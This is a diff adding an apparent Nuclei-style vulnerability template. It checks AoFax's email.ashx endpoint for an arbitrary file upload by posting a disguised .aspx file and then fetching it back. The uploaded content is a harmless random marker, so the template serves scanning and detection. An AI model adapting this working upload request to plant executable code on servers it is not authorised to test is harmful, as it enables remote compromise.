@@ -1,0 +1,50 @@
+id: poc-yaml-aofax-email-ashx-anyfile-upload
+info:
+  name: AoFax email.ashx Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: upload
+
+variables:
+  t1: "{{rand_base(6)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /handle/email.ashx?action=updatefiles&logname=stc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+        Content-Type: image/png
+
+        {{t2}}
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "oldfileName"
+        part: body
+
+  - raw:
+      - |
+        GET /upFiles/email/temp/stc/{{t1}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
